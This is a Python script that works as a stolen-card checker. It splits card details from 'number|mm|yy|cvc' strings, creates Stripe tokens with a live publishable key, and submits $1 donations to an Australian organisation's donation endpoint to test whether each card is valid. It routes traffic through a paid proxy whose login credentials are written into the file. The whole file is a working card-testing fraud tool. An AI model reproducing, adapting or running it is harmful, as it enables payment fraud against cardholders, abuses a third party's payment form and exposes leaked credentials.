import requests, re, random, time
from proxy import reqproxy, make_request

proxies = [
    "brd.superproxy.io:33335:brd-customer-hl_79bd0714-zone-datacenter_proxy1:5aqamf4mqtlv"
]

def get_working_proxy():
	while True:
		proxy_str = random.choice(proxies)
		try:
			session, ip = reqproxy(proxy_str)
			test = session.get("https://httpbin.org/ip", timeout=10)
			if test.status_code == 200:
				print(f"[+] Working proxy : IP: {ip}")
				return session
		except Exception as e:
			print(f"[-] Proxy failed: {proxy_str} - {e}")
			time.sleep(1)  # Avoid hammering proxies too fast

def Tele(ccx):
	session = get_working_proxy()

	ccx = ccx.strip()
	n, mm, yy, cvc = ccx.split("|")
	if "20" in yy:
		yy = yy.split("20")[1]

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fc4c47a1722%3B+stripe-js-v3%2Fc4c47a1722%3B+split-card-element&key=pk_live_6A04a5kca6TR8yLA6h7FL7UT'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	
	tok = response.json()['id']
	
	headers = {
	    'authority': 'ahvise.org.au',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://ahvise.org.au',
	    'referer': 'https://ahvise.org.au/donation/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'donate',
	    'email': 'rodamuser08@gmail.com',
	    'custom_price': '$1',
	    'usingCustomPrice': 'true',
	    'price': '1',
	    'occurance': '',
	    'stripeToken': f'{tok}',
	}
	
	response = requests.post('https://ahvise.org.au/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	return (response.text)
